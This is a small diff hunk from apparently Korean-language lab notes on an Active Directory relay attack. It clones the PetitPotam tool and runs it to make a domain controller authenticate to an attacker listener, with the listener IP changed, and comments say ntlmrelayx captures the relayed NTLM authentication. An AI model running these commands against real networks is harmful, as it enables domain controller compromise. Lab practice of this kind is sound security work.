@@ -969,7 +969,7 @@ impacket-ntlmrelayx \
 
 # 2) PetitPotam (DC 가 attacker 로 NTLM 인증)
 git clone https://github.com/topotam/PetitPotam ~/petitpotam
-python3 ~/petitpotam/PetitPotam.py 192.168.0.112 $DC
+python3 ~/petitpotam/PetitPotam.py 10.20.30.202 $DC   # 6v6-attacker 의 listener
 
 # 3) ntlmrelayx 가 자동:
 #    - DC 의 NTLM 인증 받음
